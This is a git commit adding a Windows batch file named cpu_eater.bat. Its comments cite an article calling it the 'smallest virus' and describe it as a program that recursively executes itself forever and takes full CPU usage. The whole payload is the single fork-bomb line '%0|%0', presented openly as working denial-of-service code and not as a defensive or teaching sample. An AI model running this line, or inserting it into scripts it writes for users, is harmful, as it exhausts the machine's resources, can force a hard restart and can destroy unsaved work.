f945b64ad5a37486c842377012bdc2baef3ed635
Minhas Kamal <minhaskamal024@gmail.com>
2016-11-16 21:43:32 +0600

    cpu eater

---
+++ cpu_eater.bat
@@ -0,0 +1,4 @@
+:: Source- www.technicalnews.in/smallest-virus-of-the-world-5-characters-can-eat-your-machine
+:: This batch program recursively executes itself forever and takes full CPU usage.
+
+%0|%0
